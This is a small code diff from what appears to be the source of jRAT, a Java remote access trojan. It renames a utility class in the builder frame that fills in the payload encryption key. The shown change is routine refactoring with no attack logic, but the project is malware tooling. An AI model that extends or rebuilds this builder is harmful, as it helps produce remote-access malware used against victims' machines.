@@ -44,7 +44,7 @@ import pro.jrat.net.PortListener;
 import pro.jrat.settings.Settings;
 import pro.jrat.ui.components.PortListenerJComboBox;
 import pro.jrat.utils.NetworkUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -124,7 +124,7 @@ public class FrameBuildMinimal extends BaseFrame {
 
 		JLabel lblKey = new JLabel("Key:");
 
-		txtKey = new JTextField(Settings.getGlobal().getString("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().getString("bkey") : Util.randomString(Crypto.KEY_LENGTH));
+		txtKey = new JTextField(Settings.getGlobal().getString("bkey").length() == Crypto.KEY_LENGTH ? Settings.getGlobal().getString("bkey") : Utils.randomString(Crypto.KEY_LENGTH));
 		txtKey.addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyReleased(KeyEvent arg0) {
